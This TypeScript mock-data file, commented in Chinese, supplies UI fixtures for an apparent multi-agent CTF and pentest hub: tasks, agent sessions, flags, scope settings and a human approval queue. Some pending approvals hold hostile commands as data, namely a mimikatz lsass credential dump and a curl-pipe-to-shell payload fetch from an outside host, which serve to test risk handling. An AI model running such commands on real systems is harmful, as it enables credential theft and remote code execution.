/**
 * Mock 快照数据：让 T6 三栏布局在「没有真实主进程」时也能渲染出有意义的内容。
 * 内容形状严格对齐契约 `HubSnapshot`，A 对接后整块替换成 `hub:snapshot` 的真实返回。
 */
import type { AttachmentView, ApprovalView, ArtifactView, FlagCandidateView, HubSnapshot, ScoreboardView, TargetView } from "../contract.ts";

const T0 = 1760300000000; // 固定时间戳，保证输出可复现

/**
 * P3-C：3 个已导入附件（文本/图片/zip）+ 5 个产物。
 * 时间戳固定，smoke 输出可复现；sha256 只是展示用假值，不是真实文件哈希。
 */
export const MOCK_ATTACHMENTS: AttachmentView[] = [
  {
    name: "题目说明.txt",
    relativePath: "题目说明.txt",
    size: 128,
    sha256: "9f2c1d4e5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d",
    type: "txt",
    source: "upload",
    importedAt: T0 + 3000,
  },
  {
    name: "screenshot.png",
    relativePath: "screenshot.png",
    size: 2048,
    sha256: "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b",
    type: "png",
    source: "upload",
    importedAt: T0 + 3000,
  },
  {
    name: "bundle.zip",
    relativePath: "bundle.zip",
    size: 4096,
    sha256: "deadbeef00112233445566778899aabbccddeeff00112233445566778899aabb",
    type: "zip",
    source: "upload",
    importedAt: T0 + 3000,
  },
];

export const MOCK_ARTIFACTS: ArtifactView[] = [
  {
    path: "evidence/flag.txt",
    name: "flag.txt",
    size: 64,
    mtime: T0 + 6000,
    kind: "text",
    previewable: true,
  },
  {
    path: "artifacts/screenshot.png",
    name: "screenshot.png",
    size: 2048,
    mtime: T0 + 5500,
    kind: "image",
    previewable: true,
  },
  {
    path: "artifacts/dump.bin",
    name: "dump.bin",
    size: 1024,
    mtime: T0 + 5000,
    kind: "binary",
    previewable: true,
  },
  {
    path: "artifacts/page.html",
    name: "page.html",
    size: 256,
    mtime: T0 + 4500,
    kind: "text",
    previewable: true,
  },
  {
    path: "artifacts/tool.exe",
    name: "tool.exe",
    size: 4096,
    mtime: T0 + 4000,
    kind: "binary",
    previewable: true,
  },
];

/**
 * P2-C：技能库 mock 状态。
 *
 * - `buildMockSnapshot()` 保持 P2-C 之前的形状（**不带** skill），用来验证旧快照兼容；
 * - 多任务世界默认带「已配置」；`{ skill: "unconfigured" }` 给出未配置世界。
 * 字段形状与 P2-A 的 `HubSnapshot.skill?` 一致。
 */
export const MOCK_SKILL_CONFIGURED = {
  configured: true,
  root: "D:\\agent\\skill",
  packages: ["ctf-0day", "ctf-solver"],
  builtAt: T0 + 12000,
  source: "dev" as const,
};

export const MOCK_SKILL_UNCONFIGURED = {
  configured: false,
  root: null,
  packages: [] as string[],
  builtAt: null,
  source: null,
  error: "未找到技能库：BUMIMANG_SKILL_DIR / config.skillDir / 开发态 ../skill 均不存在",
};

export type MockSkillMode = "configured" | "unconfigured" | "none";

/**
 * P2-C：渲染层预置的简报预览字段（**不是**冻结契约的一部分）。
 *
 * 主进程目前不在快照里暴露简报（P2-B 的简报只发给 agent），所以这里只做一个
 * 可选前向兼容槽位：真实应用不带该字段时 UI 整块不显示；mock 用来验证视图。
 * 只放标题/路径/可用性/证据约定摘要，绝不放 steps 全文。
 */
export interface MockBriefingPreview {
  playbookTitle: string;
  skillRoutingPaths: string[];
  knowledgeToolsAvailable: boolean;
  evidenceRule: string;
}

export type MockSnapshot = HubSnapshot & { briefingPreview?: MockBriefingPreview };

const MOCK_BRIEFING_CONFIGURED: MockBriefingPreview = {
  playbookTitle: "Web 单题检查表",
  skillRoutingPaths: [
    "skills/ctf-0day/知识库/web/injection.md",
    "skills/ctf-solver/SSTI.idx.md",
    "skills/ctf-0day/SKILL.md",
  ],
  knowledgeToolsAvailable: true,
  evidenceRule: "命令回显写入 evidence/<name>.txt；submit_fact 的 witness 用任务目录相对路径",
};

const MOCK_BRIEFING_UNCONFIGURED: MockBriefingPreview = {
  playbookTitle: "通用解题检查表",
  skillRoutingPaths: [],
  knowledgeToolsAvailable: false,
  evidenceRule: "命令回显写入 evidence/<name>.txt；submit_fact 的 witness 用任务目录相对路径",
};

export function buildMockSnapshot(): HubSnapshot {
  const task1 = {
    id: "task-1",
    title: "不迷茫 · 夜间靶场：拿下 10.0.0.9",
    brief:
      "目标 10.0.0.9 是一台内网 Web 服务。请找到入口、提权并提交 flag。授权范围仅限 10.0.0.0/24。",
    status: "solving" as const,
    answer: null,
    solvedBy: null,
    createdAt: T0,
    category: "web" as const,
    priority: 20,
    runningSessions: 2,
    totalSessions: 3,
    updatedAt: T0 + 8000,
    archived: false,
    flagCandidate: null,
  };
  const snap: HubSnapshot = {
    task: task1,
    // R19：第二道更早的任务，让「切换任务」在 mock 下也有东西可切。
    tasks: [
      task1,
      {
        id: "task-0",
        title: "更早的一道：10.0.0.5 门户打点",
        brief: "10.0.0.5 是门户站，先信息收集再打点。授权范围仅限 10.0.0.0/24。",
        status: "abandoned",
        answer: null,
        solvedBy: null,
        createdAt: T0 - 3600_000,
        category: "pentest" as const,
        priority: 0,
        runningSessions: 0,
        totalSessions: 0,
        updatedAt: T0 - 3600_000,
        archived: false,
        flagCandidate: null,
      },
    ],
    sessions: [
      {
        id: "s1",
        taskId: "task-1",
        agent: "opencode",
        role: "lead",
        tier: "guarded",
        status: "running",
        acpSession: "acp-s1",
        pid: 8123,
        model: null,
        startedAt: T0 + 1000,
        endedAt: null,
      },
      {
        id: "s2",
        taskId: "task-1",
        agent: "codex",
        role: "verify",
        tier: "autonomous",
        status: "running",
        acpSession: "acp-s2",
        pid: 8124,
        model: null,
        startedAt: T0 + 5000,
        endedAt: null,
      },
      {
        id: "s3",
        taskId: "task-1",
        agent: "opencode",
        role: "recon",
        tier: "autonomous",
        status: "blocked",
        acpSession: null,
        pid: null,
        model: null,
        startedAt: T0 + 8000,
        endedAt: T0 + 9000,
      },
    ],
    approvals: [
      // 高危 + 长命令 + 同类重复（真实队列形状：action 是 session/request_permission）
      {
        id: "ap1",
        taskId: "task-1",
        sessionId: "s1",
        action: "session/request_permission",
        command:
          'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit" | tee C:\\Users\\Public\\lsass-dump.txt && echo done',
        target: "C:\\Users\\Public\\lsass-dump.txt",
        intentSummary: "需要从本机提取凭据用于横向移动，目标是把 lsass 的内存导出后离线破解。",
        rule: "credential-actions-need-human",
        risk: "high",
        status: "pending",
        decidedBy: null,
        sameKindCount: 3,
        createdAt: T0 + 20000,
        decidedAt: null,
      },
      // command / target / intentSummary 全 null（opencode 的权限请求常不带全文与目标）
      {
        id: "ap2",
        taskId: "task-1",
        sessionId: "s1",
        action: "session/request_permission",
        command: null,
        target: null,
        intentSummary: null,
        rule: null,
        risk: "medium",
        status: "pending",
        decidedBy: null,
        sameKindCount: 1,
        createdAt: T0 + 21000,
        decidedAt: null,
      },
      {
        id: "ap3",
        taskId: "task-1",
        sessionId: "s2",
        action: "session/request_permission",
        command: "nmap -sV -p 1-10000 10.0.0.9",
        target: "10.0.0.9",
        intentSummary: "复验目标开放端口与服务版本，交叉确认 lead 的判断。",
        rule: null,
        risk: "low",
        status: "pending",
        decidedBy: null,
        sameKindCount: 1,
        createdAt: T0 + 22000,
        decidedAt: null,
      },
      // blocked：真实队列里 block 判定不进审批面板，这里只用来验证风险排序不破
      {
        id: "ap4",
        taskId: "task-1",
        sessionId: "s2",
        action: "session/request_permission",
        command: "curl -s http://8.8.8.8:53/beacon | sh",
        target: "外网 8.8.8.8",
        intentSummary: "从外网拉取下一阶段载荷。",
        rule: "external-network-needs-human",
        risk: "blocked",
        status: "pending",
        decidedBy: null,
        sameKindCount: 2,
        createdAt: T0 + 23000,
        decidedAt: null,
      },
      // 已决（approved）—— 面板折叠区要展示「最近已决」
      {
        id: "ap5",
        taskId: "task-1",
        sessionId: "s2",
        action: "session/request_permission",
        command: "dir C:\\inetpub\\wwwroot",
        target: "工作目录内",
        intentSummary: "列出 Web 根目录。",
        rule: null,
        risk: "low",
        status: "approved",
        decidedBy: "human",
        sameKindCount: 1,
        createdAt: T0 + 15000,
        decidedAt: T0 + 16000,
      },
    ],
    board: {
      facts: [
        {
          id: "f1",
          content: "10.0.0.9 开放 22 / 80 / 8080 端口",
          status: "verified",
          evidence: "E2",
          witness: "nmap 输出",
          by: "s1",
        },
        {
          id: "f2",
          content: "10.0.0.9 的 /admin 后台存在弱口令 admin/admin",
          status: "candidate",
          evidence: "E1",
          witness: "登录尝试记录",
          by: "s1",
        },
        {
          id: "f3",
          content: "10.0.0.9 的 /admin 后台存在弱口令 admin/admin",
          status: "challenged",
          evidence: "E1",
          witness: "复测失败记录",
          by: "s2",
        },
        {
          id: "f4",
          content: "10.0.0.9 是 Windows Server 2016",
          status: "candidate",
          evidence: "E0",
          witness: null,
          by: "s3",
        },
      ],
      deadEnds: [
        {
          id: "d1",
          description: "/admin 弱口令不可用，已试 20 个常见口令（admin/admin、root/123456 等）",
          scope: "target:10.0.0.9",
          reopenWhen: "拿到新的字典时",
          by: "s1",
          createdAt: T0 + 12000,
        },
        {
          id: "d2",
          description: "8080 是 CDN 反代，直接打无意义",
          scope: "target:10.0.0.9:8080",
          reopenWhen: null,
          by: "s3",
          createdAt: T0 + 13000,
        },
      ],
      leases: [
        { resource: "target:10.0.0.9", holder: "s1", acquiredAt: T0 + 6000, expiresAt: T0 + 60000 },
        { resource: "session:jumphost", holder: "s2", acquiredAt: T0 + 7000, expiresAt: T0 + 70000 },
      ],
      intents: [
        { id: "i1", description: "枚举 10.0.0.9 的 Web 入口", status: "open", claimedBy: null },
        { id: "i2", description: "利用 /admin 弱口令进入后台", status: "claimed", claimedBy: "s1" },
        { id: "i3", description: "尝试 FTP 匿名登录", status: "blocked_by_conflict", claimedBy: null },
      ],
    },
    health: {
      s1: { toolCalls: 42, boardReads: 5, syncLag: 3 },
      s2: { toolCalls: 87, boardReads: 2, syncLag: 9 },
    },
    agents: [
      {
        id: "codex",
        title: "Codex",
        installed: true,
        installHint: "npm i -g @openai/codex",
        maturity: "稳定",
        permissionBehavior: "requests_by_default",
      },
      {
        id: "claude",
        title: "Claude",
        installed: true,
        installHint: "npm i -g @anthropic-ai/claude-code",
        maturity: "稳定",
        permissionBehavior: "requests_by_default",
      },
      {
        id: "opencode",
        title: "opencode",
        installed: true,
        installHint: "npm i -g opencode-ai",
        maturity: "稳定",
        permissionBehavior: "requests_by_default",
      },
      {
        id: "dsh",
        title: "DeepSeek Harness",
        installed: true,
        installHint:
          "装 DeepSeek Harness 桌面版（它自带 dsh CLI）；装到非常规位置时，把 agents.json 的 dsh 指到 <安装目录>\\resources\\runtime\\cli\\bin\\dsh.cmd",
        maturity: "桌面版自带 CLI；--profile acp 是标准 ACP v1 stdio server（握手实测通过）",
        permissionBehavior: "requests_by_default",
      },
    ],
  };
  // P1-E：旧快照补上可选的新字段（旧断言仍只读原有字段，不会被打断）。
  snap.approvalsAll = snap.approvals.map((a) => ({ ...a, taskTitle: task1.title }));
  snap.quota = { maxSessionsPerTask: 3, maxSessionsTotal: 8, runningSessions: 2 };
  return snap;
}

// ---------------------------------------------------------------- P1-E 多任务 mock

// ---------------------------------------------------------------- P5-C flag 候选

/**
 * 多任务世界的 flag 候选（按 taskId 分组）。
 *
 * 真实 Hub 的 `HubSnapshot.flags` 只暴露焦点任务；非焦点任务的候选只体现在
 * `TaskView.flagCount`。smoke 用这组夹具验证「焦点 3 条、非焦点 1 条」。
 */
export const MOCK_FLAGS_BY_TASK: Record<string, FlagCandidateView[]> = {
  "task-mt-b": [
    {
      id: "flag-mt-b-1",
      taskId: "task-mt-b",
      value: "flag{multi_b}",
      status: "new",
      evidence: "E2",
      firstSeen: T0 + 8100,
      sources: [
        { sessionId: "mt-b1", witness: "evidence/rsa.txt", evidence: "E2", seenAt: T0 + 8100 },
      ],
      submittedAt: null,
      submitStatus: null,
    },
    {
      id: "flag-mt-b-2",
      taskId: "task-mt-b",
      value: "flag{multi_b_2}",
      status: "new",
      evidence: "E1",
      firstSeen: T0 + 8200,
      sources: [
        { sessionId: "mt-b2", witness: "evidence/notes.txt", evidence: "E1", seenAt: T0 + 8200 },
      ],
      submittedAt: null,
      submitStatus: null,
    },
    {
      id: "flag-mt-b-3",
      taskId: "task-mt-b",
      value: "flag{multi_b_3}",
      status: "confirmed",
      evidence: "E0",
      firstSeen: T0 + 8300,
      sources: [{ sessionId: "mt-b1", witness: null, evidence: "E0", seenAt: T0 + 8300 }],
      submittedAt: T0 + 8400,
      submitStatus: "manual",
    },
  ],
  "task-mt-a": [
    {
      id: "flag-mt-a-1",
      taskId: "task-mt-a",
      value: "flag{multi_a_1}",
      status: "new",
      evidence: "E1",
      firstSeen: T0 + 8000,
      sources: [
        { sessionId: "mt-a1", witness: "evidence/a.txt", evidence: "E1", seenAt: T0 + 8000 },
      ],
      submittedAt: null,
      submitStatus: null,
    },
  ],
  "task-mt-arch": [],
};

/** P5-D：按 taskId 取 mock 候选；submits="none" 时清空提交历史（无提交世界）。 */
export function mockFlagsForTask(
  taskId: string,
  submits: "present" | "none" = "present",
): FlagCandidateView[] {
  return (MOCK_FLAGS_BY_TASK[taskId] ?? []).map((c) => ({
    ...c,
    sources: c.sources.map((s) => ({ ...s })),
    ...(submits === "none" ? { submittedAt: null, submitStatus: null } : {}),
  }));
}

/** P5-D：mock 侧记分板聚合（与主进程同口径：含归档，flagCount=候选总数）。 */
export function buildMockScoreboard(
  tasks: Array<{ id: string; title: string; status: string; points?: number }>,
  flagCounts: Record<string, number>,
): ScoreboardView {
  const rows = tasks.map((t) => ({
    taskId: t.id,
    title: t.title,
    status: t.status as ScoreboardView["tasks"][number]["status"],
    points: t.points ?? 0,
    flagCount: flagCounts[t.id] ?? 0,
  }));
  return {
    tasks: rows,
    solved: rows.filter((t) => t.status === "solved").length,
    total: rows.length,
    points: rows.reduce((sum, t) => sum + t.points, 0),
  };
}

const MULTI_TASKS = [
  {
    id: "task-mt-a",
    title: "多任务 A · 10.0.0.7 Web",
    brief: "多任务 mock：A 题两个会话在跑，审批队列有一条待批。",
    status: "solving" as const,
    answer: null,
    solvedBy: null,
    createdAt: T0 + 2000,
    category: "web" as const,
    priority: 20,
    runningSessions: 2,
    totalSessions: 2,
    updatedAt: T0 + 8000,
    archived: false,
    flagCandidate: null,
    flagCount: 1,
    points: 50,
  },
  {
    id: "task-mt-b",
    title: "多任务 B · Crypto",
    brief: "多任务 mock：B 是当前焦点，两个会话 + 一条待批；C 已归档。",
    status: "solving" as const,
    answer: null,
    solvedBy: null,
    createdAt: T0 + 3000,
    category: "crypto" as const,
    priority: 30,
    runningSessions: 2,
    totalSessions: 2,
    updatedAt: T0 + 9000,
    archived: false,
    flagCandidate: "flag{multi_b}",
    flagCount: 3,
    points: 100,
  },
  {
    id: "task-mt-arch",
    title: "已归档 · Misc 历史题",
    brief: "多任务 mock：已归档任务，历史事实/会话保留，看板折叠展示。",
    status: "solved" as const,
    answer: "flag{archived}",
    solvedBy: "human",
    createdAt: T0 + 1000,
    category: "misc" as const,
    priority: 0,
    runningSessions: 0,
    totalSessions: 2,
    updatedAt: T0 + 7000,
    archived: true,
    flagCandidate: null,
    flagCount: 0,
    points: 25,
  },
];

const MULTI_SESSIONS = [
  {
    id: "mt-a1", taskId: "task-mt-a", agent: "opencode", role: "lead" as const,
    tier: "guarded" as const, status: "running" as const, acpSession: "acp-mt-a1",
    pid: 9101, model: null, startedAt: T0 + 4000, endedAt: null,
  },
  {
    id: "mt-a2", taskId: "task-mt-a", agent: "codex", role: "verify" as const,
    tier: "autonomous" as const, status: "waiting_approval" as const, acpSession: "acp-mt-a2",
    pid: 9102, model: null, startedAt: T0 + 5000, endedAt: null,
  },
  {
    id: "mt-b1", taskId: "task-mt-b", agent: "claude", role: "lead" as const,
    tier: "guarded" as const, status: "running" as const, acpSession: "acp-mt-b1",
    pid: 9103, model: null, startedAt: T0 + 6000, endedAt: null,
  },
  {
    id: "mt-b2", taskId: "task-mt-b", agent: "opencode", role: "recon" as const,
    tier: "autonomous" as const, status: "idle" as const, acpSession: "acp-mt-b2",
    pid: 9104, model: null, startedAt: T0 + 7000, endedAt: null,
  },
  {
    id: "mt-x1", taskId: "task-mt-arch", agent: "codex", role: "scribe" as const,
    tier: "guarded" as const, status: "done" as const, acpSession: null,
    pid: null, model: null, startedAt: T0 + 500, endedAt: T0 + 1500,
  },
  {
    id: "mt-x2", taskId: "task-mt-arch", agent: "opencode", role: "verify" as const,
    tier: "autonomous" as const, status: "stopped" as const, acpSession: null,
    pid: null, model: null, startedAt: T0 + 600, endedAt: T0 + 1600,
  },
];

const MULTI_APPROVALS = [
  {
    id: "mt-ap-a", taskId: "task-mt-a", taskTitle: MULTI_TASKS[0].title,
    sessionId: "mt-a2", action: "session/request_permission",
    command: "nmap -sV 10.0.0.7", target: "10.0.0.7",
    intentSummary: "A 题复验端口。", rule: null, risk: "medium" as const,
    status: "pending" as const, decidedBy: null, sameKindCount: 1,
    createdAt: T0 + 8000, decidedAt: null,
  },
  {
    id: "mt-ap-b", taskId: "task-mt-b", taskTitle: MULTI_TASKS[1].title,
    sessionId: "mt-b1", action: "session/request_permission",
    command: "python solve.py", target: "工作目录内",
    intentSummary: "B 题跑密码学脚本。", rule: null, risk: "low" as const,
    status: "pending" as const, decidedBy: null, sameKindCount: 1,
    createdAt: T0 + 9000, decidedAt: null,
  },
  {
    id: "mt-ap-arch", taskId: "task-mt-arch", taskTitle: MULTI_TASKS[2].title,
    sessionId: "mt-x1", action: "session/request_permission",
    command: "cat misc.txt", target: "工作目录内",
    intentSummary: "历史审批。", rule: null, risk: "low" as const,
    status: "approved" as const, decidedBy: "human", sameKindCount: 1,
    createdAt: T0 + 2000, decidedAt: T0 + 2500,
  },
];

/** P4-D：范围/目标 mock 世界开关；默认 none 保持旧快照形状。 */
export type MockScopeMode = "none" | "disabled" | "enabled";
export type MockTargetMode = "none" | "present" | "empty";

/**
 * P6-B 批次 2b：代理状态 mock 世界。
 *
 * `legacy` = scope 存在但 proxy 没有 state（旧快照）；`legacy-disabled` = 默认关的旧快照。
 * 其余四个值与契约 `ProxyState` 一致。
 */
export type MockProxyStateMode =
  | "none"
  | "running"
  | "failed"
  | "stopped"
  | "starting"
  | "legacy"
  | "legacy-disabled";

function mockProxyView(
  mode: MockProxyStateMode,
): NonNullable<NonNullable<HubSnapshot["scope"]>["proxy"]> {
  switch (mode) {
    case "running":
      return { enabled: true, port: 12345, state: "running" };
    case "failed":
      return { enabled: true, port: null, state: "failed", error: "EADDRINUSE" };
    case "stopped":
      return { enabled: true, port: null, state: "stopped" };
    case "starting":
      return { enabled: true, port: null, state: "starting" };
    case "legacy":
      return { enabled: true, port: null };
    case "legacy-disabled":
      return { enabled: false, port: null };
    default:
      return { enabled: false, port: null };
  }
}

function mockTargets(taskId: string): TargetView[] {
  return [
    {
      id: "tg-1",
      taskId,
      value: "10.0.0.0/8",
      kind: "cidr",
      status: "unknown",
      notes: "内网段（示例）",
      createdAt: T0 + 10000,
    },
    {
      id: "tg-2",
      taskId,
      value: "10.1.2.3",
      kind: "host",
      status: "alive",
      notes: "Web 入口",
      createdAt: T0 + 11000,
    },
    {
      id: "tg-3",
      taskId,
      value: "http://10.1.2.3:8080/admin",
      kind: "url",
      status: "unknown",
      notes: "后台入口",
      createdAt: T0 + 12000,
    },
  ];
}

const SCOPE_APPROVAL: ApprovalView = {
  id: "mt-ap-scope",
  taskId: "task-mt-b",
  taskTitle: MULTI_TASKS[1].title,
  sessionId: "mt-b1",
  action: "session/request_permission",
  command: "curl http://8.8.8.8/x",
  target: null,
  intentSummary: "目标不在授权范围，等待人工确认。",
  rule: "no-out-of-scope",
  ruleId: "no-out-of-scope",
  scopeTarget: { kind: "url", value: "8.8.8.8" },
  risk: "high",
  status: "pending",
  decidedBy: null,
  sameKindCount: 1,
  createdAt: T0 + 9500,
  decidedAt: null,
};

/** P1-E mock 引擎用：全部任务的会话（快照里只放焦点任务的）。 */
export function buildMultiTaskMockSessions(): HubSnapshot["sessions"] {
  return MULTI_SESSIONS.map((s) => ({ ...s }));
}

export type MockAttachmentMode = "present" | "none";

export function buildMultiTaskMockSnapshot(
  focusTaskId = "task-mt-b",
  opts: {
    skill?: MockSkillMode;
    attachments?: MockAttachmentMode;
    scope?: MockScopeMode;
    /** P6-B 批次 2b：代理真实状态世界（与 scope.enabled 独立）。 */
    proxyState?: MockProxyStateMode;
    targets?: MockTargetMode;
    scopeApproval?: boolean;
    /** P5-C：present = 焦点 3 个候选；none = 已知无候选（flags: []）。 */
    flags?: "present" | "none";
    /** P5-D：present = 保留 mock 提交历史；none = 全部未提交。 */
    submits?: "present" | "none";
  } = {},
): MockSnapshot {
  const focus = MULTI_TASKS.find((t) => t.id === focusTaskId && !t.archived) ?? MULTI_TASKS[1];
  const sessions = MULTI_SESSIONS.filter((s) => s.taskId === focus.id).map((s) => ({ ...s }));
  const scopeMode = opts.scope ?? "none";
  const proxyStateMode = opts.proxyState ?? "none";
  const targetMode = opts.targets ?? "none";
  const includeScopeApproval = opts.scopeApproval === true && focus.id === "task-mt-b";
  const approvals = MULTI_APPROVALS.filter((a) => a.taskId === focus.id).map((a) => ({ ...a }));
  if (includeScopeApproval) approvals.push({ ...SCOPE_APPROVAL });
  const skillMode = opts.skill ?? "configured";
  const attachmentMode = opts.attachments ?? "present";
  const flagsMode = opts.flags ?? "present";
  const submitsMode = opts.submits ?? "present";
  const flagsByTask: Record<string, FlagCandidateView[]> = {};
  for (const t of MULTI_TASKS) {
    flagsByTask[t.id] = flagsMode === "none" ? [] : mockFlagsForTask(t.id, submitsMode);
  }
  const focusFlags: FlagCandidateView[] = flagsByTask[focus.id] ?? [];
  const focusAttachments =
    attachmentMode === "present" ? MOCK_ATTACHMENTS.map((a) => ({ ...a })) : [];
  const artifacts = attachmentMode === "present" ? MOCK_ARTIFACTS.map((a) => ({ ...a })) : [];
  const focusTargets =
    targetMode === "present"
      ? mockTargets(focus.id)
      : targetMode === "empty"
        ? []
        : undefined;
  const focusTask = {
    ...focus,
    attachments: focusAttachments,
    attachmentCount: focusAttachments.length,
    flagCount: focusFlags.length,
    ...(flagsMode === "none" ? { flagCandidate: null } : {}),
    ...(targetMode === "none"
      ? {}
      : {
          targets: focusTargets,
          denyTargets: targetMode === "present" ? ["10.9.9.9", "metadata.internal"] : [],
          scopeNotes: targetMode === "present" ? "仅授权 10.0.0.0/8；deny 优先" : null,
        }),
  };
  const tasks = MULTI_TASKS.map((t) =>
    t.id === focus.id
      ? focusTask
      : {
          ...t,
          // 非焦点任务只给数量，不给完整清单（与真实 Hub 的快照语义一致）。
          flagCount: flagsByTask[t.id]?.length ?? 0,
          attachmentCount: attachmentMode === "present" && t.id === "task-mt-a" ? 1 : 0,
        },
  );
  const scope =
    scopeMode === "none" && proxyStateMode === "none"
      ? undefined
      : {
          enabled: scopeMode === "enabled",
          outOfScopeAction: "approve" as const,
          proxy: mockProxyView(proxyStateMode),
        };
  return {
    task: focusTask,
    tasks,
    sessions,
    approvals,
    flags: focusFlags,
    scoreboard: buildMockScoreboard(
      tasks,
      Object.fromEntries(Object.entries(flagsByTask).map(([id, list]) => [id, list.length])),
    ),
    approvalsAll: [
      ...MULTI_APPROVALS,
      ...(includeScopeApproval ? [SCOPE_APPROVAL] : []),
    ].map((a) => ({ ...a })),
    attachments: focusAttachments,
    artifacts,
    quota: {
      maxSessionsPerTask: 3,
      maxSessionsTotal: 8,
      // 两个活跃任务各 2 个会话；archived 不计入全局配额。
      runningSessions: 4,
    },
    ...(scope ? { scope } : {}),
    permissionGrants: [],
    skill:
      skillMode === "none"
        ? undefined
        : skillMode === "unconfigured"
          ? { ...MOCK_SKILL_UNCONFIGURED, packages: [...MOCK_SKILL_UNCONFIGURED.packages] }
          : { ...MOCK_SKILL_CONFIGURED, packages: [...MOCK_SKILL_CONFIGURED.packages] },
    briefingPreview:
      skillMode === "none"
        ? undefined
        : skillMode === "unconfigured"
          ? { ...MOCK_BRIEFING_UNCONFIGURED }
          : { ...MOCK_BRIEFING_CONFIGURED },
    board: {
      facts: [
        { id: "mt-f1", content: "B 题的 RSA 参数已拿到", status: "verified", evidence: "E2", witness: "mt-b1", by: "mt-b1" },
      ],
      deadEnds: [],
      leases: [],
      intents: [],
    },
    health: {
      [sessions[0]?.id ?? "mt-b1"]: { toolCalls: 18, boardReads: 3, syncLag: 1 },
      [sessions[1]?.id ?? "mt-b2"]: { toolCalls: 7, boardReads: 1, syncLag: 0 },
    },
    agents: buildMockSnapshot().agents,
    workDir: "D:\\agent\\xuanwo\\work",
  };
}

/** P2-C：未配置技能库的多任务世界（configured=false + error）。 */
export function buildUnconfiguredSkillMockSnapshot(focusTaskId = "task-mt-b"): MockSnapshot {
  return buildMultiTaskMockSnapshot(focusTaskId, { skill: "unconfigured" });
}

/** P3-C：无附件/无产物的世界，用于空状态与旧快照兼容断言。 */
export function buildNoAttachmentsMockSnapshot(focusTaskId = "task-mt-b"): MockSnapshot {
  return buildMultiTaskMockSnapshot(focusTaskId, { attachments: "none" });
}

/** P5-C：焦点任务已知无 flag 候选的世界（flags: []，不是旧快照的“未知”）。 */
export function buildNoFlagsMockSnapshot(focusTaskId = "task-mt-b"): MockSnapshot {
  return buildMultiTaskMockSnapshot(focusTaskId, { flags: "none" });
}

/** P5-D：有候选但全部未提交的世界（submits: "none"）。 */
export function buildNoSubmitMockSnapshot(focusTaskId = "task-mt-b"): MockSnapshot {
  return buildMultiTaskMockSnapshot(focusTaskId, { submits: "none" });
}

/**
 * P4-D：三种范围 mock 世界。
 *  - disabled：scope.enabled=false，有 targets/denyTargets/scopeNotes；
 *  - enabled：scope.enabled=true，有 targets；
 *  - no-targets：scope.enabled=false，targets=[]（不是旧快照的“未知”）。
 * 旧快照（无 scope/targets）仍由 buildMockSnapshot()/默认多任务世界覆盖。
 */
export function buildScopeMockSnapshot(
  mode: "disabled" | "enabled" | "no-targets",
): MockSnapshot {
  return buildMultiTaskMockSnapshot("task-mt-b", {
    scope: mode === "enabled" ? "enabled" : "disabled",
    targets: mode === "no-targets" ? "empty" : "present",
    scopeApproval: mode !== "no-targets",
  });
}

/**
 * P6-B 批次 2b：代理状态 mock 世界（running / failed / stopped / starting / 旧快照）。
 *
 * 用 `scope: "disabled"` 隔离范围强制文案，避免“范围已启用”与“代理失败”混在一起；
 * 代理的 `enabled` 仍按世界设置（failed/running 等为 config 意图 true）。
 */
export function buildProxyStateMockSnapshot(mode: MockProxyStateMode): MockSnapshot {
  return buildMultiTaskMockSnapshot("task-mt-b", {
    scope: "disabled",
    targets: "present",
    proxyState: mode,
  });
}
